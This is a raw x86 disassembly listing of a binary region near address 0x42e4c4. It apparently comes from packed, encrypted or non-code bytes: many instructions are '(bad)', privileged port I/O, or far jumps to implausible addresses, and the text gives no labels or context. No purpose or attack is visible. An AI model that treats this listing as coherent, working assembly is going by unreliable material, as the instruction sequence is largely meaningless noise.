  42e4c4:	lods   eax,DWORD PTR ds:[esi]
  42e4c5:	jne    0x42e4c4
  42e4c7:	xor    DWORD PTR [ecx-0x52ef1418],edi
  42e4cd:	sti    
  42e4ce:	mov    esi,edx
  42e4d0:	cld    
  42e4d1:	and    DWORD PTR [eax-0x6900006a],0xffffff9c
  42e4d8:	pop    ss
  42e4d9:	add    BYTE PTR ds:0x38faff97,al
  42e4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4e0:	js     0x42e4ac
  42e4e2:	stos   BYTE PTR es:[edi],al
  42e4e3:	out    0x7,al
  42e4e5:	mov    DWORD PTR [eax-0x4d],ecx
  42e4e8:	add    al,0x1a
  42e4eb:	jge    0x42e513
  42e4ed:	or     eax,0x15bbab92
  42e4f2:	int    0x96
  42e4f4:	jmp    0xfd74:0xff972a2e
  42e4fb:	fs inc edx
  42e4fd:	mov    al,0x2d
  42e4ff:	jmp    0x42e50b
  42e501:	xchg   eax,edx
  42e503:	push   DWORD PTR [eax+0x6f2a4d86]
  42e509:	jmp    0x42e51a
  42e50b:	sub    esp,edx
  42e50d:	sbb    DWORD PTR [eax],eax
	...
  42e52b:	add    BYTE PTR [eiz*4+0xa460816],cl
  42e532:	loope  0x42e549
  42e534:	int    0xff
  42e536:	arpl   bx,ax
  42e538:	ror    BYTE PTR [edi-0x55],0x4
  42e53c:	or     al,0x80
  42e53e:	in     al,dx
  42e53f:	stos   DWORD PTR es:[edi],eax
  42e540:	or     al,0x2b
  42e542:	jmp    0x42e4c7
  42e544:	mov    al,ds:0xd837e8a6
  42e549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e54a:	fcom   QWORD PTR [ebx]
  42e54c:	cmp    BYTE PTR [edx],0x2d
  42e54f:	sbb    DWORD PTR ds:0xf5364250,ecx
  42e555:	mov    ds:0x401dafd4,eax
  42e55a:	jmp    0xe943d64d
  42e55f:	add    edx,DWORD PTR [esi]
  42e561:	jge    0x42e54f
  42e563:	lods   al,BYTE PTR ds:[esi]
  42e564:	out    0xa3,al
  42e566:	and    al,BYTE PTR [esi-0x1f]
  42e569:	xor    al,0xca
  42e56b:	add    ecx,DWORD PTR ds:0xd5f0ee97
  42e571:	jg     0x42e574
  42e573:	add    DWORD PTR [esi],edx
  42e575:	lea    ebp,[eax]
  42e577:	cmp    cl,BYTE PTR [ecx+eiz*4+0xd0014]
  42e57e:	retw   0x790f
  42e582:	xor    al,0xb0
  42e584:	stos   BYTE PTR es:[edi],al
  42e585:	cld    
  42e586:	mov    ds:0xd2019641,al
  42e58b:	xor    DWORD PTR [ebp+0x389a98],ebx
	...
  42e5ad:	add    BYTE PTR ds:0x79296600,cl
  42e5b3:	add    BYTE PTR [edx],bl
  42e5b5:	dec    edx
  42e5b6:	loop   0x42e5e3
  42e5b8:	add    al,ah
  42e5ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5bb:	sub    eax,0xeffcaef4
  42e5c0:	adc    DWORD PTR [ecx],ebp
  42e5c2:	or     DWORD PTR [edx+0x45],edi
  42e5c5:	sahf   
  42e5c6:	cwde   
  42e5c7:	bound  edx,QWORD PTR [ecx+ebp*8]
  42e5ca:	mov    esp,0xc5e5664e
  42e5cf:	das    
  42e5d0:	inc    eax
  42e5d1:	es jbe 0x42e602
  42e5d4:	rcl    BYTE PTR [ecx-0x16ffcc51],0x67
  42e5db:	cs loopne 0x42e55f
  42e5de:	xchg   edi,eax
  42e5df:	xor    al,0x0
  42e5e1:	jmp    0x772ad45d
  42e5e6:	aad    0xff
  42e5e8:	jmp    FWORD PTR [ecx+0x4f]
  42e5eb:	cld    
  42e5ec:	dec    edx
  42e5ed:	aam    0xb3
  42e5ef:	inc    esi
  42e5f0:	pop    edx
  42e5f1:	sub    bl,BYTE PTR [edx-0x41]
  42e5f4:	add    edi,DWORD PTR [ebp+0x7b]
  42e5f7:	inc    eax
  42e5f8:	add    dl,bh
  42e5fa:	ret    
  42e5fb:	dec    ebp
  42e5fc:	mov    DWORD PTR [esi-0xaa4881a],ecx
  42e602:	iret   
  42e603:	ds add al,0x35
  42e606:	pop    ebx
  42e607:	inc    eax
  42e608:	add    BYTE PTR [ecx-0x16bfed42],al
  42e60e:	inc    ebp
  42e60f:	aas    
  42e610:	adc    al,0x71
	...
  42e62e:	add    BYTE PTR [eax],al
  42e630:	push   esi
  42e631:	add    al,0x89
  42e633:	sahf   
  42e634:	scas   al,BYTE PTR es:[edi]
  42e635:	ja     0x42e692
  42e637:	int    0x31
  42e639:	inc    edi
  42e63a:	sub    BYTE PTR [ecx-0x19efc134],bl
  42e640:	ja     0x42e64e
  42e642:	sar    bl,1
  42e644:	dec    esi
  42e645:	add    BYTE PTR [ebp-0x5c954aa2],cl
  42e64b:	jmp    0x12ae65e
  42e650:	in     eax,dx
  42e651:	int3   
  42e652:	idiv   edi
  42e654:	std    
  42e655:	in     eax,dx
  42e656:	and    ebx,DWORD PTR [esi-0x13]
  42e659:	xor    eax,0xf833c628
  42e65e:	add    bh,al
  42e660:	xor    ebx,DWORD PTR [ebp+esi*1-0x7d019c00]
  42e667:	(bad)  
  42e668:	pop    ds
  42e669:	mov    ebx,0x869d8b4f
  42e66e:	or     eax,DWORD PTR [eax]
  42e670:	xor    al,0xfe
  42e672:	in     eax,dx
  42e673:	inc    esp
  42e674:	push   eax
  42e675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e676:	add    BYTE PTR [edx+eiz*1+0x4d],dh
  42e67a:	call   0x3eee9f
  42e67f:	mov    dh,bl
  42e681:	xor    eax,0x4f2404ba
  42e686:	sub    esp,0x55
  42e689:	dec    ebx
  42e68a:	jnp    0x42e6f1
  42e68c:	pop    eax
  42e68d:	std    
  42e68e:	jp     0x42e70f
  42e690:	clc    
  42e691:	std    
  42e692:	dec    ebp
  42e693:	mov    DWORD PTR [eax],0x0
	...
  42e6b1:	add    bl,dh
  42e6b3:	sbb    DWORD PTR [edx+0x4aefe440],eax
  42e6b9:	push   ebx
  42e6ba:	outs   dx,DWORD PTR ds:[esi]
  42e6bb:	or     BYTE PTR ds:[ebx+0x348d5999],cl
  42e6c2:	pop    esp
  42e6c3:	and    bh,dh
  42e6c5:	xor    bl,BYTE PTR [edi]
  42e6c7:	xchg   esp,eax
  42e6c8:	push   ebx
  42e6c9:	or     BYTE PTR [edx+0xc5d88f3],ah
  42e6cf:	and    al,BYTE PTR [eax+0x4]
  42e6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6d3:	inc    eax
  42e6d4:	clc    
  42e6d5:	call   0x3a3da3
  42e6da:	das    
  42e6db:	(bad)  
  42e6dc:	jp     0x42e723
  42e6de:	lods   al,BYTE PTR ds:[esi]
  42e6df:	fdivr  QWORD PTR [edx]
  42e6e1:	cmp    ecx,DWORD PTR [esp+eiz*4+0x6d]
  42e6e5:	jmp    0x853104f7
  42e6ea:	or     DWORD PTR [ebx+0x10],0xfffffffb
  42e6ee:	sti    
  42e6ef:	xchg   edx,eax
  42e6f0:	rol    BYTE PTR [edx],0x45
  42e6f3:	sub    eax,0x56650044
  42e6f8:	cmp    eax,0x9c090d00
  42e6fd:	mov    ebp,0xfaff96d6
  42e702:	rol    BYTE PTR [edx-0x31aeba83],1
  42e708:	inc    eax
  42e709:	or     al,0xbf
  42e70b:	loope  0x42e759
  42e70d:	lea    edi,[edx-0x6ed16866]
  42e713:	and    DWORD PTR [ecx+0xfb],ebp
	...
  42e731:	add    BYTE PTR [eax],al
  42e733:	add    BYTE PTR [edx+0x1143c09e],bh
  42e739:	mov    edi,DWORD PTR [edx+0x40]
  42e73c:	or     eax,0xd478a4f
  42e741:	xchg   edi,eax
  42e742:	rol    BYTE PTR [ebx],0xd1
  42e745:	ret    0x3f
  42e748:	imul   esp,eax,0xffffffc4
  42e74b:	push   ebp
  42e74c:	xchg   esi,eax
  42e74d:	dec    edx
  42e74e:	dec    edi
  42e74f:	or     WORD PTR [edi+0x1e],cx
  42e753:	inc    edi
  42e754:	or     eax,0x61c07a97
  42e759:	mov    BYTE PTR [eax+eiz*2+0x60849709],0x5
  42e761:	xchg   edi,eax
  42e762:	rol    BYTE PTR [eax],0xc5
  42e765:	sbb    al,0x44
  42e767:	add    BYTE PTR [ebx+ebx*2+0x1609e7a3],dl
  42e76e:	sbb    edi,esp
  42e770:	or     eax,0xdfc2316
  42e775:	sub    DWORD PTR [ebx],0xf3599660
  42e77b:	mov    WORD PTR [ecx],cs
  42e77d:	add    BYTE PTR [edi+edi*8-0x66],ch
  42e781:	mov    al,ds:0xf81e76e9
  42e786:	cmp    BYTE PTR [ecx+eiz*2-0x76fc16cb],bl
  42e78d:	mov    edi,0xf193d83d
  42e792:	dec    esi
  42e793:	add    BYTE PTR [eax+0x53b53a],al
	...
  42e7b5:	add    BYTE PTR [edx+0x976dd38],dl
  42e7bb:	jg     0x42e7f6
  42e7bd:	test   eax,0x43f33400
  42e7c2:	or     eax,0x93f82a75
  42e7c7:	icebp  
  42e7c8:	gs mov edi,0x82f57311
  42e7ce:	int    0x76
  42e7d0:	and    bh,al
  42e7d2:	mov    DWORD PTR [esi-0x1850003],esi
  42e7d8:	jge    0x42e7e2
  42e7da:	mov    bh,BYTE PTR [edx]
  42e7dc:	gs jl  0x42e7fc
  42e7df:	jp     0x42e80a
  42e7e1:	das    
  42e7e2:	stc    
  42e7e3:	mov    al,ds:0xcfffdb
  42e7e8:	and    DWORD PTR [ebp+0x4d],edi
  42e7eb:	add    BYTE PTR [ecx-0x3],dl
  42e7ee:	push   ebx
  42e7ef:	add    cl,ch
  42e7f1:	push   ecx
  42e7f2:	in     eax,0x4
  42e7f4:	sahf   
  42e7f5:	add    ecx,DWORD PTR ds:0xd44928d2
  42e7fb:	ret    
  42e7fc:	mov    esp,0xd83e97c
  42e801:	pop    ss
  42e802:	mov    cl,BYTE PTR [ebp-0x1b]
  42e805:	push   esp
  42e806:	pop    edi
  42e807:	aaa    
  42e808:	add    DWORD PTR [edx+edx*1],edx
  42e80b:	add    cl,ch
  42e80d:	jp     0x42e85f
  42e80f:	cwde   
  42e810:	fs ret 
  42e812:	push   es
  42e813:	mov    es,WORD PTR [eax]
  42e815:	pop    edx
  42e816:	sldt   WORD PTR [eax]
  42e819:	bound  eax,QWORD PTR [eax]
	...
  42e837:	add    bl,ah
  42e839:	pop    es
  42e83a:	jg     0x42e89d
  42e83c:	xchg   ebp,eax
  42e83d:	add    BYTE PTR [ebx],cl
  42e83f:	imul   edx,DWORD PTR [ebx],0x1
  42e842:	add    cl,ch
  42e844:	(bad)  
  42e845:	and    eax,0x5f7fe998
  42e84a:	lea    eax,[ebp+eax*4+0x67]
  42e84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e84f:	push   ebx
  42e850:	fldenv [esi-0x73]
  42e853:	sub    al,0xc9
  42e855:	and    eax,0x58811900
  42e85a:	cmp    eax,ebp
  42e85c:	push   cs
  42e85d:	pop    ds
  42e85e:	(bad)  
  42e85f:	in     eax,dx
  42e860:	nop
  42e861:	inc    ebp
  42e862:	sti    
  42e863:	jmp    0xe943831f
  42e868:	push   cs
  42e869:	fwait
  42e86a:	jne    0x42e861
  42e86c:	mov    bh,0x44
  42e86e:	clc    
  42e86f:	xchg   ecx,eax
  42e870:	out    dx,al
  42e871:	in     eax,dx
  42e872:	(bad)  
  42e873:	call   0x6e90399b
  42e878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e879:	adc    ecx,DWORD PTR [ebp-0x7afe677f]
  42e87f:	sub    DWORD PTR [edx],ebx
  42e881:	cmp    DWORD PTR [eax+ebp*8],0xe
  42e885:	add    BYTE PTR [edi+0x7c8cb6a4],al
  42e88b:	je     0x42e8e6
  42e88d:	lahf   
  42e88e:	mov    ebx,0x740371b0
  42e893:	push   es
  42e894:	sub    BYTE PTR [esi+ebx*1],dl
  42e897:	mov    al,ds:0xdffad11d
	...
  42e8b8:	add    BYTE PTR [eax],al
  42e8ba:	mov    bl,0xf4
  42e8bc:	ret    
  42e8bd:	cmc    
  42e8be:	dec    esi
  42e8bf:	add    BYTE PTR [edi+0x51c3ef],al
  42e8c5:	retf   0x2fcf
  42e8c8:	sti    
  42e8c9:	add    cl,bl
  42e8cb:	ret    0x4014
  42e8ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e8cf:	sbb    DWORD PTR [esi],eax
  42e8d1:	and    esi,edi
  42e8d3:	std    
  42e8d4:	mov    BYTE PTR [ecx],al
  42e8d6:	pslld  mm6,mm6
  42e8d9:	ss mov bl,0xef
  42e8dc:	ret    
  42e8dd:	adc    al,0xe4
  42e8df:	add    esp,ebx
  42e8e1:	or     BYTE PTR [ebx-0x54],ah
  42e8e4:	not    BYTE PTR ds:0x400eb4
  42e8ea:	in     al,0xe7
  42e8ec:	test   BYTE PTR [eax],0x38
  42e8ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e8f0:	div    BYTE PTR [edi]
  42e8f2:	mov    ds:0x5aff0bcf,eax
  42e8f7:	gs adc eax,0x425a58
  42e8fd:	sub    DWORD PTR [eax+0x29c08496],0xffffff99
  42e904:	div    BYTE PTR [esi]
  42e906:	mov    WORD PTR [ebp+eax*2+0x1e812400],?
  42e90d:	add    BYTE PTR [edi-0x6020443],ah
  42e913:	data16 cmp BYTE PTR [ebp-0x4d],0x9e
  42e918:	push   es
  42e919:	cmp    BYTE PTR [esi],0x65
  42e91c:	idiv   edi
	...
  42e93a:	add    BYTE PTR [eax],al
  42e93c:	mov    eax,ds:0xb9c797cf
  42e941:	xchg   ebp,eax
  42e942:	(bad)  
  42e943:	push   esp
  42e945:	add    DWORD PTR [ebx+0x74c16906],eax
  42e94b:	pop    esp
  42e94c:	popa   
  42e94d:	jecxz  0x42e97e
  42e94f:	mov    eax,DWORD PTR [ebx+0x4fd14f61]
  42e955:	xor    dl,BYTE PTR [eax+0x6a]
  42e958:	in     al,0x79
  42e95a:	jne    0x42e94b
  42e95c:	xrelease mov DWORD PTR gs:[edi+0xd],eax
  42e961:	idiv   DWORD PTR [edi-0x40]
  42e964:	cmp    BYTE PTR [ecx-0x3a79fd1c],ch
  42e96a:	jbe    0x42e92b
  42e96c:	mov    dl,ah
  42e96e:	sub    eax,DWORD PTR [edi]
  42e970:	xchg   esi,eax
  42e971:	out    0x96,al
  42e973:	add    bh,bh
  42e975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e976:	inc    DWORD PTR [ebp+ecx*8-0x3bd0efe1]
  42e97d:	and    al,0xc4
  42e97f:	jp     0x42e9b6
  42e981:	dec    ebp
  42e982:	cmp    DWORD PTR [edx+edx*8],0xcc032d4d
  42e989:	add    DWORD PTR [esp+edi*2-0x72f94d87],edi
  42e990:	jmp    0x42e988
  42e992:	dec    esp
  42e993:	dec    edi
  42e994:	bound  edx,QWORD PTR [ebp-0x58a716e9]
  42e99a:	jmp    edi
  42e99c:	sbb    DWORD PTR [esi+0xfba5],ecx
	...
  42e9be:	xchg   esp,eax
  42e9bf:	in     eax,dx
  42e9c0:	inc    ebx
  42e9c1:	test   DWORD PTR [ebp-0xc],ecx
  42e9c4:	std    
  42e9c5:	and    BYTE PTR [edx],dl
  42e9c7:	sub    bh,BYTE PTR [edx-0x813cdfc]
  42e9cd:	je     0x42e952
  42e9cf:	and    bh,BYTE PTR [ebx]
  42e9d1:	or     BYTE PTR [esi-0x32790821],dl
  42e9d7:	mov    ?,WORD PTR [eax+0x7c]
  42e9da:	test   DWORD PTR [ebx],edi
  42e9dc:	jns    0x42ea21
  42e9de:	adc    eax,0x6dc01867
  42e9e3:	cmp    al,0x2d
  42e9e5:	add    al,0x5d
  42e9e7:	das    
  42e9e8:	repz dec eax
  42e9ea:	or     eax,0x61c07ba7
  42e9ef:	add    eax,0x63906016
  42e9f4:	xchg   DWORD PTR [eax-0x7a],edx
  42e9f7:	jmp    FWORD PTR [ecx-0x763f9405]
  42e9fd:	add    BYTE PTR [edi],cl
  42e9ff:	xor    BYTE PTR [edx],dl
  42ea01:	sqrtps xmm6,xmm6
  42ea04:	test   al,0x3
  42ea06:	xchg   edx,eax
  42ea07:	inc    esp
  42ea08:	icebp  
  42ea09:	js     0x42e9d0
  42ea0b:	sub    BYTE PTR [eax],dh
  42ea0d:	and    al,0x2a
  42ea0f:	(bad)  
  42ea10:	in     eax,0x0
  42ea12:	pop    ss
  42ea13:	mov    ebp,DWORD PTR [ecx-0xebb7bfe]
  42ea19:	das    
  42ea1a:	or     DWORD PTR [eax-0x18],edx
  42ea1d:	cwde   
  42ea1e:	adc    ecx,DWORD PTR [ebx+0x8c2c]
	...
  42ea40:	jne    0x42eabb
  42ea42:	int    0xa4
  42ea44:	jbe    0x42ea17
  42ea46:	test   al,0x44
  42ea48:	xlat   BYTE PTR ds:[ebx]
  42ea49:	cmp    BYTE PTR [eax+0x3f0015c1],dh
  42ea4f:	or     ch,dh
  42ea51:	(bad)  
  42ea52:	xor    eax,0x65a80d41
  42ea57:	out    0xd,eax
  42ea59:	add    BYTE PTR [esi+0x1e],ah
  42ea5c:	dec    ecx
  42ea5d:	jmp    DWORD PTR [ebp+0x1e]
  42ea60:	sub    eax,0x53e5dff
  42ea65:	mov    DWORD PTR [esp+eiz*4],esi
  42ea68:	cli    
  42ea69:	inc    edi
  42ea6a:	in     eax,dx
  42ea6b:	hlt    
  42ea6c:	stos   DWORD PTR es:[edi],eax
  42ea6d:	(bad)
  42ea70:	or     eax,0x89fc2989
  42ea75:	add    esi,DWORD PTR [ecx+0x7a]
  42ea78:	enter  0x16b3,0xae
  42ea7c:	xchg   esp,eax
  42ea7d:	adc    eax,0x87157835
  42ea82:	mov    al,ds:0x214d85fb
  42ea87:	jle    0x42ea4d
  42ea89:	or     esp,DWORD PTR [ebp-0x76]
  42ea8c:	or     eax,0xf5e90000
  42ea91:	adc    al,0xd8
  42ea93:	fimul  WORD PTR [ebp+0xee90080]
  42ea99:	add    DWORD PTR [eax],0xffffff92
  42ea9c:	js     0x42eabe
  42ea9e:	call   FWORD PTR [eax+0x645c1c2]
	...
  42eac0:	add    BYTE PTR [eax],al
  42eac2:	push   cs
  42eac3:	cmp    BYTE PTR [ebp+0xe],0xb2
  42eac7:	sub    bl,BYTE PTR [ebp-0x12]
  42eaca:	cmp    BYTE PTR ds:0x564a62e3,bl
  42ead0:	adc    BYTE PTR [ebp+eax*8+0x16],ah
  42ead4:	push   cs
  42ead5:	out    0xb5,al
  42ead7:	pop    ecx
  42ead8:	sti    
  42ead9:	push   esp
  42eada:	add    DWORD PTR [edx-0x43491abb],0x850ee949
  42eae4:	sar    BYTE PTR [edx+edx*2],0x82
  42eae8:	pop    esp
  42eae9:	jg     0x42eb2c
  42eaeb:	test   bh,dl
  42eaed:	aaa    
  42eaee:	pop    edx
  42eaef:	xchg   esi,eax
  42eaf0:	je     0x42eb61
  42eaf2:	jno    0x42ea8a
  42eaf4:	jne    0x42eaef
  42eaf6:	add    DWORD PTR [ebp+0xc],0xffffff91
  42eafa:	push   eax
  42eafb:	dec    ecx
  42eafc:	add    cl,ch
  42eafe:	xchg   ebp,eax
  42eaff:	shl    BYTE PTR [ebp-0x37],0x8b
  42eb03:	cmp    al,0xba
  42eb05:	sbb    DWORD PTR [ebx+esi*4+0x146fda7a],eax
  42eb0c:	mov    edx,0x10156e29
  42eb11:	(bad)  
  42eb12:	les    ecx,FWORD PTR [ebx]
  42eb14:	call   0x42aba8
  42eb19:	arpl   cx,dx
  42eb1b:	adc    al,0x5
  42eb1d:	push   edi
  42eb1e:	push   esp
  42eb1f:	lahf   
  42eb20:	out    0x88,eax
  42eb22:	xchg   ecx,eax
  42eb23:	sbb    al,0xe3
	...
  42eb41:	add    BYTE PTR [eax],al
  42eb43:	add    al,ah
  42eb45:	repnz push es
  42eb47:	mov    esp,DWORD PTR [ecx-0x5e76c1a6]
  42eb4d:	pop    edx
  42eb4e:	add    DWORD PTR [ebp+0x0],0x6d
  42eb52:	outs   dx,DWORD PTR ds:[esi]
  42eb53:	jmp    FWORD PTR [ebx]
  42eb55:	pop    edi
  42eb56:	add    DWORD PTR [ebp+0x4c],0xffffffbd
  42eb5a:	inc    esp
  42eb5b:	fsub   QWORD PTR [ecx+0x84d7b06]
  42eb61:	pop    edi
  42eb62:	mov    al,0x1
  42eb64:	pop    ds
  42eb65:	cdq    
  42eb66:	test   BYTE PTR [ebp+0x14],0x6d
  42eb6a:	sub    bh,bh
  42eb6c:	fwait
  42eb6d:	pop    ebp
  42eb6e:	sub    eax,eax
  42eb70:	rol    DWORD PTR fs:[ebx+0x4d81bc65],0xfc
  42eb78:	imul   esi,DWORD PTR [ebx+edi*4+0xba6be8],0x0
  42eb80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb81:	or     al,BYTE PTR [eax]
  42eb83:	push   ebp
  42eb84:	jmp    FWORD PTR [edx+0x7b]
  42eb87:	in     al,dx
  42eb88:	cmp    BYTE PTR [ebx-0x2e8b039b],al
  42eb8e:	dec    ebp
  42eb8f:	push   edi
  42eb90:	stos   DWORD PTR es:[edi],eax
  42eb91:	test   DWORD PTR [ebx],0x5060218d
  42eb97:	call   0x3a1962
  42eb9c:	mov    al,0xbe
  42eb9e:	pop    es
  42eb9f:	test   BYTE PTR [esi+edi*8+0x47b9ffff],cl
  42eba6:	cld    
  42eba7:	push   eax
	...
  42ebc4:	add    BYTE PTR [eax],al
  42ebc6:	jl     0x42eb67
  42ebc8:	dec    ebx
  42ebc9:	call   FWORD PTR [ebx-0x4ef03f79]
  42ebcf:	push   ebp
  42ebd0:	add    BYTE PTR [eax],al
  42ebd2:	and    al,0x86
  42ebd4:	inc    ebp
  42ebd5:	vmwrite ecx,DWORD PTR [eax-0x48]
  42ebd9:	push   eax
  42ebda:	or     eax,0x5dfc4824
  42ebdf:	aas    
  42ebe0:	adc    BYTE PTR [eax-0xe],0x42
  42ebe4:	mov    al,al
  42ebe6:	sbb    ah,BYTE PTR [edi*2-0x7558f300]
  42ebed:	dec    ebp
  42ebee:	mov    ebp,0x8cd4481e
  42ebf3:	call   0xfb0de6f6
  42ebf8:	adc    eax,0xbbf2cc2
  42ebfe:	xchg   edx,eax
  42ebff:	es (bad) 
  42ec01:	dec    DWORD PTR ds:0xa4810715
  42ec07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec08:	sahf   
  42ec09:	fwait
  42ec0a:	or     eax,0x508d1c1a
  42ec0f:	stos   DWORD PTR es:[edi],eax
  42ec10:	cs call 0xfbe3c44d
  42ec16:	nop
  42ec17:	adc    ebp,DWORD PTR [si-0x7e]
  42ec1b:	cmp    al,0xb4
  42ec1d:	call   0x46cedf
  42ec22:	xchg   BYTE PTR [edi-0x7d],bl
  42ec25:	xlat   BYTE PTR ds:[ebx]
  42ec26:	loope  0x42ec11
  42ec28:	mov    WORD PTR [ebp+0x0],?
	...
  42ec47:	add    BYTE PTR ds:0xdb8951e,bh
  42ec4d:	mov    bh,0xff
  42ec4f:	call   DWORD PTR [esi]
  42ec51:	pop    edi
  42ec52:	mov    ecx,DWORD PTR [ebp+0x45]
  42ec55:	fcom   DWORD PTR [eax]
  42ec57:	inc    edx
  42ec58:	dec    edx
  42ec59:	xlat   BYTE PTR ds:[ebx]
  42ec5a:	xor    eax,0x348ad08d
  42ec5f:	call   0xfbe3e4cd
  42ec64:	nop
  42ec65:	adc    esp,DWORD PTR [bp+di]
  42ec68:	push   cs
  42ec69:	pushf  
  42ec6a:	xchg   edi,eax
  42ec6b:	daa    
  42ec6c:	cwde   
  42ec6d:	push   cs
  42ec6e:	xlat   BYTE PTR ds:[ebx]
  42ec6f:	inc    esp
  42ec70:	adc    eax,0x9007e300
  42ec75:	cwde   
  42ec76:	aam    0xb7
  42ec78:	sub    cl,BYTE PTR [ebp+0x1284c416]
  42ec7e:	push   ebp
  42ec7f:	xchg   ebp,ecx
  42ec81:	adc    dh,ah
  42ec83:	cmp    DWORD PTR [edx-0x67],ebx
  42ec86:	mov    ah,0xb
  42ec88:	cmc    
  42ec89:	fidiv  DWORD PTR [edx]
  42ec8b:	mov    eax,ds:0x10a487d6
  42ec90:	inc    edx
  42ec91:	test   al,0x9e
  42ec93:	dec    eax
  42ec94:	or     eax,0xc1476c00
  42ec99:	das    
  42ec9a:	add    edx,esi
  42ec9c:	pop    ebp
  42ec9d:	cdq    
  42ec9e:	or     al,BYTE PTR [eax+esi*1-0x3e916f7]
  42eca5:	mov    ah,BYTE PTR [edi+ebx*4+0x513ba83d]
	...
  42ecc8:	add    BYTE PTR [eax],al
  42ecca:	xchg   esi,eax
  42eccb:	cwde   
  42eccc:	les    eax,FWORD PTR fs:[esi]
  42eccf:	test   BYTE PTR [ecx],ch
  42ecd1:	mov    eax,ds:0x1e669886
  42ecd6:	cmp    edi,0x42880b5c
  42ecdc:	int    0x33
  42ecde:	gs jmp 0x85a98e15
  42ece4:	and    al,0x11
  42ece6:	push   0xffffffee
  42ece8:	gs push ds
  42ecea:	pop    ecx
  42eceb:	push   DWORD PTR [ebx+ecx*1]
  42ecee:	add    BYTE PTR [edx-0x5b],0x33
  42ecf2:	xor    eax,0x46a129f5
  42ecf7:	int    0xa8
  42ecf9:	inc    eax
  42ecfa:	xlat   BYTE PTR ds:[ebx]
  42ecfb:	xor    al,0xa0
  42ecfd:	lds    eax,FWORD PTR ds:0x398d1c00
  42ed03:	jl     0x42ec92
  42ed05:	psrld  mm6,QWORD PTR [ecx]
  42ed08:	add    BYTE PTR [esi],bl
  42ed0a:	inc    eax
  42ed0b:	xchg   ebp,eax
  42ed0c:	push   ebx
  42ed0d:	push   ss
  42ed0e:	jecxz  0x42eca8
  42ed10:	push   edx
  42ed11:	rcl    DWORD PTR ds:0xee90028,cl
  42ed17:	cmp    bl,0xdc
  42ed1a:	or     bh,BYTE PTR [edi-0x28]
  42ed1d:	pusha  
  42ed1e:	adc    ebx,DWORD PTR [eax-0x64753b77]
  42ed24:	adc    eax,0xffd7d8a9
  42ed29:	pop    edi
  42ed2a:	push   ebx
  42ed2b:	mov    WORD PTR [edi+0x31],?
	...
  42ed4a:	add    BYTE PTR [eax],al
  42ed4c:	lods   eax,DWORD PTR ds:[esi]
  42ed4d:	or     al,0x2f
  42ed4f:	mov    ecx,0xb9f43d9b
  42ed54:	jbe    0x42eceb
  42ed56:	cli    
  42ed57:	pop    ss
  42ed58:	ins    DWORD PTR es:[edi],dx
  42ed59:	jl     0x42ed1b
  42ed5b:	xchg   esp,eax
  42ed5c:	dec    eax
  42ed5d:	fwait
  42ed5e:	jne    0x42ed5d
  42ed60:	mov    ch,ch
  42ed62:	add    ebx,edx
  42ed64:	dec    esi
  42ed65:	add    BYTE PTR [ecx],bh
  42ed67:	je     0x42ede3
  42ed69:	or     al,0x9
  42ed6b:	out    dx,al
  42ed6c:	clc    
  42ed6d:	xchg   ebx,eax
  42ed6e:	sti    
  42ed6f:	cld    
  42ed70:	add    al,BYTE PTR [esi]
  42ed72:	inc    eax
  42ed73:	jmp    0x5e3b01d9
  42ed78:	or     BYTE PTR [ebx-0x126d2e8b],bl
  42ed7e:	add    ebx,edx
  42ed80:	into   
  42ed81:	(bad)  
  42ed82:	cmp    BYTE PTR [eax*4+0x2c6a0b0c],bh
  42ed89:	mov    ebx,?
  42ed8b:	xor    eax,0x9d759b00
  42ed90:	stos   BYTE PTR es:[edi],al
  42ed91:	in     eax,dx
  42ed92:	add    edi,edx
  42ed94:	into   
  42ed95:	jmp    FWORD PTR ds:0x5739faa9
  42ed9b:	mov    al,ds:0x84f
  42eda0:	lahf   
  42eda1:	inc    edx
  42eda2:	and    BYTE PTR [ebx+0x400a0f59],cl
  42eda8:	and    al,0x84
  42edaa:	inc    ebp
  42edab:	or     al,0x5d
  42edad:	loopne 0x42edaa
  42edaf:	je     0x42edb1
	...
  42edcd:	add    cl,bh
  42edcf:	jne    0x42ee46
  42edd1:	cld    
  42edd2:	arpl   WORD PTR [esi-0x9],cx
  42edd5:	jne    0x42edc7
  42edd7:	int    0x4e
  42edd9:	push   0xffffffe8
  42eddb:	jne    0x42ee52
  42eddd:	clc    
  42edde:	push   ebx
  42eddf:	cdq    
  42ede0:	xchg   ebx,eax
  42ede1:	adc    dh,BYTE PTR [edx+eax*1-0x44dfba77]
  42ede8:	mov    esi,0x6b768c74
  42eded:	and    BYTE PTR [ebp+esi*2-0x58e3f78b],al
  42edf4:	cld    
  42edf5:	jmp    DWORD PTR [ebx]
  42edf7:	ja     0x42ee6e
  42edf9:	cld    
  42edfa:	cs push esp
  42edfc:	not    esi
  42edfe:	pop    ds
  42edff:	mov    ecx,0x27412ff
  42ee04:	cmp    DWORD PTR [ebp-0x64],edi
  42ee07:	out    dx,al
  42ee08:	add    al,0xff
  42ee0a:	sbb    DWORD PTR [ebx-0x9],edi
  42ee0d:	(bad)  
  42ee0e:	sub    eax,0x7f74f3e1
  42ee13:	cmp    DWORD PTR [ebp-0xc],0xff04ee63
  42ee1a:	fnstenv [edi-0x9]
  42ee1d:	(bad)  
  42ee1e:	faddp  st(1),st
  42ee20:	jecxz  0x42edb7
  42ee22:	cli    
  42ee23:	into   
  42ee24:	xor    cl,0xa3
  42ee27:	xchg   edi,eax
  42ee28:	jmp    0x42ee3c
  42ee2a:	and    al,0xfc
  42ee2c:	cmp    al,0x9f
  42ee2f:	mov    al,0x2a
  42ee31:	rol    BYTE PTR [eax],0x0
	...
  42ee50:	hlt    
  42ee51:	push   edx
  42ee52:	loopne 0x42edd9
  42ee54:	or     eax,0xab291366
  42ee59:	mov    ch,0x5d
  42ee5b:	leave  
  42ee5c:	cwde   
  42ee5d:	out    0xed,al
